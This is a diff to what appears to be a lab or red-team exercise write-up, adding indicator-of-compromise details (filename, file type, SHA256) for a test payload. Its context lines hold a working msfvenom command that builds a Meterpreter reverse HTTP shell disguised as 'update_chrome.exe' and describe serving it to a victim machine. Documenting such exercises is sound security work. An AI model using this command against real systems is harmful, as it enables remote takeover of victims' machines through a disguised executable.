@@ -40,6 +40,11 @@ I utilized `msfvenom` to generate a **stageless** reverse HTTP payload. This pay
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.0.10.3 LPORT=8080 -f exe -o update_chrome.exe
 ```
 
+**Artifact Details (IOC):**
+* **Filename:** `update_chrome.exe`
+* **File Type:** PE32+ executable (GUI) x86-64
+* **SHA256 Hash:** `b5a71ccc777b32a5bdd89ca84651f49cfa822ff719bfb9bc3f386f225203df88`
+
 ### 2. Delivery Mechanism
 To simulate the payload delivery, I spun up a temporary Python HTTP server on port 8000, allowing the victim machine to download the malicious binary.
 
